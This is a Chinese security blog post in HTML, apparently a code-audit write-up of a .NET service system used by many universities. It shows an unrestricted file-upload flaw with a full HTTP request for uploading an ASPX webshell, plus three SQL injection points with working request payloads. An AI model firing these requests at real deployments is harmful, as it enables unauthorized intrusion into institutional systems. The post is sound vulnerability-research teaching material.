@@ -1,0 +1,833 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.jpg">
+  <link rel="icon" href="/img/head.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zjacky">
+  <meta name="keywords" content="Zjacky">
+  
+    <meta name="description" content="前言代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是大多高校用的一个通用系统，本篇原作者为@冬夏@Segador师傅 由于带着我审了下.NET的站点于是有了这篇文章 ‍ 黑盒黑盒的过程大概讲述一下即可，其实就是有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 - .NET - 通用系统审计">
+<meta property="og:url" content="https://zjackky.github.io/post/code-audit-net-general-system-audit-24d238.html">
+<meta property="og:site_name" content="Zjacky Blog">
+<meta property="og:description" content="前言代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是大多高校用的一个通用系统，本篇原作者为@冬夏@Segador师傅 由于带着我审了下.NET的站点于是有了这篇文章 ‍ 黑盒黑盒的过程大概讲述一下即可，其实就是有">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053730.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053655.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053812.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449155.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449294.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449419.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053907.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053015.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053795.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449728.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449949.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449312.png">
+<meta property="og:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449416.png">
+<meta property="article:published_time" content="2023-12-23T11:34:12.000Z">
+<meta property="article:modified_time" content="2023-12-24T06:48:56.000Z">
+<meta property="article:author" content="Zjacky">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053730.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>代码审计 - .NET - 通用系统审计 - Zjacky Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zjackky.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"$","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zjacky&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="代码审计 - .NET - 通用系统审计"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-23 19:34" pubdate>
+          2023年12月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          23 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">代码审计 - .NET - 通用系统审计</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是大多高校用的一个通用系统，本篇原作者为@冬夏@Segador师傅 由于带着我审了下<code>.NET</code>的站点于是有了这篇文章</p>
+<p>‍</p>
+<h1 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h1><p>黑盒的过程大概讲述一下即可，其实就是有个注册的接口进行注册，然后通过注册进去后直接上传一个免杀马(听@Segador说是还需要加入PNG的头部绕一下(其实在CTF中确实也比较常见啥PNG头啊GIF89a啊啥的都行吧))，传上去就可以解析了，于是源码就有了</p>
+<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在此之前先了解<code>c#</code>​每个文件的含义，以便是0基础的师傅也能看懂什么意思</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">aspx：应用程序根目录或子目录，包含web控件与其他cs：类文件aspx.cs：web窗体后台程序代码文件<br><br>ascx：应用程序根目录或子目录,Web 用户控件文件<br><br>asmx：应用程序根目录或子目录，该文件包含通过 SOAP 方式可用于其他 Web 应用程序的类和方法<br><br>asax：应用程序根目录，通常是Global.asax<br><br>config：应用程序根目录或子目录，通常是web.config<br><br>ashx：应用程序根目录或子目录,该文件包含实现 IHttpHandler 接口以处理所有传入请求的代码<br><br>soap:应用程序根目录或子目录 soap拓展文件dll:在ASP.NET Web应用程序中，通常会将每个页面或控件编译成一个独立的DLL文件。这些DLL文件包含了与页面相关的代码、控件、用户控件等。当用户访问网站时，ASP.NET引擎会动态加载这些DLL文件以提供所需的功能<br><br>那么就一句话概括，重点就是看dll，aspx或者aspx.cs这三个文件<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>了解每个文件的意思之后，我们在定位到<code>Default.aspx</code>​这个文件，查看<code>AutoEventWireup</code>​、<code>CodeFile</code>​、<code>Inherits</code>​这三个参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">AutoEventWireup（自动事件绑定）：这是一个布尔值属性，用于指示编译器是否自动连接页面的事件处理程序。如果设置为<span class="hljs-literal">true</span>，则编译器会自动尝试将命名为特定模式的方法与页面的生命周期事件相关联，例如Page_Load或Button_Click等。如果设置为<span class="hljs-literal">false</span>，则需要手动显式地将事件与处理程序绑定。<br><br>CodeFile`（代码文件：在ASP.NET中，这是指包含与页面相关代码的文件。在Web Forms中，一个页面通常由两部分组成：.aspx文件（包含HTML和控件布局）和.aspx.cs（C<span class="hljs-comment">#代码）或.aspx.vb（VB.NET代码）文件。CodeFile属性用于指定与.aspx页面关联的代码文件。Inherits（继承）：这是指定代码文件中类的基类的属性。在ASP.NET中，.aspx.cs或.aspx.vb文件中的类通常继承自ASP.NET提供的页面基类（如System.Web.UI.Page）。</span><br><br>Inherits属性用于指定页面类所继承的基类。这些概念在ASP.NET Web Forms中是很重要的，它们有助于管理页面的事件处理、代码文件的关联以及页面类的继承关系。<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053730.png" srcset="/img/loading.gif" lazyload></p>
+<p>在一般的<code>.NET</code>代码中我们要重点关注<code>inherits</code>(继承)，因为WEB应用程序会把我们写的代码编译为DLL文件存放在Bin文件夹中，在<code>ASPX</code>文中基本就是一些控件名，所以需要反编译他的DLL来进行审计。在bin目录应该是会存在<code>_Default.dll</code>一个主编译，但是在这个代码中没有这个文件，所以我们只能从<code>aspx.cs</code>这些文件入手。</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>现在主流的框架都是mvc三层模型，这种一般我们都是观看controller层来进行寻找特定的方法（后续我会写这种源码怎么审计）那么这套源码也是我见过在.net算奇葩的，它通过ajax方式来访问特定的方法，这是登录页面来触发的</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053655.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以去查看下<code>UserLogin.aspx.cs</code> </p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053812.png" srcset="/img/loading.gif" lazyload></p>
+<p>那么就能猜出大概的结构</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ajax/文件名（UserLogin）,App_Web_knyu3gfu.ashx?\_method=方法（login）&amp;\_session=rw（ReadWrite）<br></code></pre></td></tr></table></figure>
+
+
+
+<p>既然猜出结构之后 就发现了有一个<code>UploadFile</code>​ 的目录 </p>
+<p>于是关注到<code>LoalUploadFile.aspx.cs</code>​这个文件，这里的aksk等云方面的代码进行注释也就是说并不上云。并且这里有一个特别重要的一串代码</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Soft51.CMServiceSystem.Web.UpLoadFile</span>在.<span class="hljs-title">NET</span>中，<span class="hljs-title">namespace</span>（命名空间）是用于组织和管理代码的一种机制。它被用来将相关的类型、类、接口、委托等组织在一起，以便更好地管理代码结构、防止命名冲突，并提高代码的可读性和可维护性。 说人话就跟<span class="hljs-title">java</span>中的<span class="hljs-title">Private</span>方法类似<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449155.png" srcset="/img/loading.gif" lazyload></p>
+<p> 所以知道这串代码的意思就定位到文件保存的步骤，下面我将代码选取出去并分别解释每串所讲的意思</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs C#">[<span class="hljs-meta">Ajax.AjaxMethod(Ajax.HttpSessionStateRequirement.ReadWrite)</span>]<br>  \\声明方法及变量:<br>  saveLocalfailes方法：这是一个公共方法，返回类型为ResultFile。<br>  file, tmpfilename, fileName：这是方法的参数，分别表示Base64编码的文件内容，临时文件名，以及原始文件名。<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> ResultFile <span class="hljs-title">saveLocalfailes</span>(<span class="hljs-params">String file, <span class="hljs-built_in">string</span> tmpfilename, <span class="hljs-built_in">string</span> fileName</span>)</span><br>        &#123;<br>            ResultFile result = <span class="hljs-keyword">new</span> ResultFile();    <span class="hljs-comment">//ResultFile创建了该类的一个新实例并将其分配给变量result</span><br>            <span class="hljs-built_in">string</span> type =  <span class="hljs-string">&quot;.&quot;</span> + fileName.Split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>];  <span class="hljs-comment">//fileName. 它假定fileName包含一个句点（点）作为其结构的一部分，例如“example.txt”。该Split方法用于fileName使用点作为分隔符将字符串拆分为子字符串数组。该[1]索引用于获取分割字符串的第二部分，假定该部分是文件类型。然后将结果与点连接起来，创建格式为“.txt”的字符串。该字符串被分配给变量type。</span><br>            result.fileName = fileName;<br>            result.type = type;          <span class="hljs-comment">//fileName和type值分别赋给对象的fileName和属性。这将使用之前根据 确定的值来设置对象的属性</span><br><br>            /<br>            <span class="hljs-keyword">var</span> httpContext = System.Web.HttpContext.Current;  <span class="hljs-comment">//获取当前HTTP上下文对象。</span><br>            <span class="hljs-built_in">string</span> http = httpContext.Request.Url.Scheme;  <span class="hljs-comment">//获取HTTP请求的协议（http或https）。</span><br>            <span class="hljs-built_in">string</span> addr = httpContext.Request.Url.Authority;  <span class="hljs-comment">//获取HTTP请求的主机地址。</span><br><br>          <br>            <span class="hljs-built_in">string</span> appPath = AppDomain.CurrentDomain.BaseDirectory;  <span class="hljs-comment">//获取应用程序的基目录。</span><br>            <span class="hljs-built_in">string</span> AttachmentFiles = <span class="hljs-string">&quot;AttachmentFiles&quot;</span>;      <span class="hljs-comment">//文件夹名称。</span><br>            <span class="hljs-built_in">string</span> folderPath = Path.Combine(appPath, AttachmentFiles);  <br><br>            <span class="hljs-keyword">if</span> (!Directory.Exists(folderPath))        <span class="hljs-comment">//通过组合应用程序基目录和文件夹名称得到文件夹的完整路径。如果文件夹不存在，则创建文件夹</span><br>            &#123;<br>                Directory.CreateDirectory(folderPath);    <br>            &#125;<br><br>            <span class="hljs-built_in">string</span> filePath = AttachmentFiles + <span class="hljs-string">&quot;/&quot;</span> + tmpfilename +type; <span class="hljs-comment">//拼接得到文件相对路径。</span><br>            folderPath = folderPath + <span class="hljs-string">&quot;\\&quot;</span> + tmpfilename +  type;   <span class="hljs-comment">//拼接得到文件的完整路径。</span><br>            <span class="hljs-built_in">byte</span>[] fileBytes = Convert.FromBase64String(file);   <br>            File.WriteAllBytes(folderPath, fileBytes);       <span class="hljs-comment">//将Base64编码的文件内容解码为字节数组。使用File.WriteAllBytes将字节数组写入文件。</span><br>  <br>            <span class="hljs-built_in">string</span> url = http +<span class="hljs-string">&quot;://&quot;</span>+addr+<span class="hljs-string">&quot;/&quot;</span>+ filePath;     <span class="hljs-comment">//进行拼接</span><br>            result.url = url;             <span class="hljs-comment">//生成文件的访问URL。</span><br>            <span class="hljs-keyword">return</span> result;        <br>        &#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449294.png" srcset="/img/loading.gif" lazyload></p>
+<p>   那么知道这串代码并没有对文件后缀进行显示，也没有白名单和过滤的设置。根据上面所知的方法来构造payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /ajax/Soft51.CMServiceSystem.Web.UpLoadFile.LocalUpLoadFile,App_Web_o5xcnfs2.ashx?_method=saveLocalfailes&amp;_session=rw HTTP/1.1<br>Host: xxxx<br>Cookie: ASP.NET_SessionId=xxx<br>Content-Length: 9361<br>Sec-Ch-Ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;91&quot;</span>, <span class="hljs-string">&quot; Not;A Brand&quot;</span>;v=<span class="hljs-string">&quot;99&quot;</span><br>Sec-Ch-Ua-Mobile: ?0<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36<br>Content-Type: text/plain;charset=UTF-8<br>Accept: */*<br>Sec-Fetch-Site: same-origin<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Dest: empty<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Connection: close<br><br>file=<span class="hljs-built_in">base64</span>加密过后的免杀马子<br>tmpfilename=1<br>fileName=1.aspx<br></code></pre></td></tr></table></figure>
+
+<p>至此马子进行解析</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449419.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="第一处SQL"><a href="#第一处SQL" class="headerlink" title="第一处SQL"></a>第一处SQL</h3><p>sql注入我目前的寻找方式，只能寻找每个参数是否代入sql语句中进行查询(稍微理解一下，在哪存在sql？肯定是数据交互的点，比如 注册 下载 登录 查询 信息 等地方)，在查看注册代码的时候也是很明显直接将参数<code>ParentID</code>​直接代入到sql语句中并没有做过多的一个过滤(其实也就是靠猜了，猜他写的内容是否会带入到sql查询当中)</p>
+<p>下面的代码接受<code>ParentID</code>​传参并且有order by 这种字眼所以可以大胆猜测为sql查询</p>
+<p>那么就构造payload，根据前面所解释的结构，<code>\_mothod</code>​是方法，<code>Register_BiddingBodyRegister</code>​对应目录和文件名，session&#x3D;no是因为这里没有对session进行一个限制，并且这是一个数据型的注入，可以直接用数字型-user来进行报错处理</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053907.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /ajax/Register_BiddingBodyRegister,App_Web_ggq5haij.ashx?_method=GetAreaChildInfo&amp;_session=no HTTP/1.1<br>Host: xxxxxx<br>Accept: */*<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Length: 27<br>Content-Type: text/plain;charset=UTF-8<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: same-origin<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36<br>sec-ch-ua: <span class="hljs-string">&quot;Not_A Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;120&quot;</span>, <span class="hljs-string">&quot;Google Chrome&quot;</span>;v=<span class="hljs-string">&quot;120&quot;</span><br>sec-ch-ua-mobile: ?0<br>sec-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><br>parentID=1-user<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053015.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个sql两个接口都可以的</p>
+<p>这里其实有个问题，这个<code>App_Web_ggq5haij.ashx</code>​ 怎么来的啊？</p>
+<p>其实后面研究了下他是得跳转的，具体跳转到时哪个ashx文件还没有解释明白，但从注册的接口中抓包就可以抓到这个目录了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312292053795.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="第二处SQL"><a href="#第二处SQL" class="headerlink" title="第二处SQL"></a>第二处SQL</h3><p>在<code>LocalUploadFile.aspx</code>​文件中，也有直接进行参数拼接的语句</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449728.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据<code>namespace</code>​命名空间，来构造payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ajax/Soft51.CMServiceSystem.Web.UpLoadFile.LocalUpLoadFile,App_Web_o5xcnfs2.ashx?_method=getAttachmentType&amp;_session=rw<br>分别解释每段意思<br>Soft51.CMServiceSystem.Web:命名空间<br>UpLoadFile:目录<br>LocalUpLoadFile:文件<br>getAttachmentType:方法<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449949.png" srcset="/img/loading.gif" lazyload></p>
+<p>‍</p>
+<h3 id="第三处SQL"><a href="#第三处SQL" class="headerlink" title="第三处SQL"></a>第三处SQL</h3><p>在<code>PushCertApply.aspx</code>​文件中，定义一个方法和两个参数，这里的进行一个try尝试，pass参数必须为0.0才能执行code参数的代入，并且这里前后有’’所以判断是字符型，从而来闭合语句构造payload</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449312.png" srcset="/img/loading.gif" lazyload>​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /ajax/PushCertApply,App_Web_knyu3gfu.ashx?_method=PushCertApplyByCode&amp;_session=no HTTP/1.1<br>Host: xxxx<br>Cookie: ASP.NET_SessionId=xxx<br>Content-Length: 28<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36<br><br><br>Code=1<span class="hljs-string">&#x27;-(1-user)-&#x27;</span><br>pass=0.0<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312241449416.png" srcset="/img/loading.gif" lazyload>​</p>
+<p>至此由于注入很多很多，我就不一一展示，主要展示寻找路径和理解框架，还有.net代码如何审计，这个是特例的一个例子野蛮少见的，后续我会写一篇对dll文件审计</p>
+<p>‍</p>
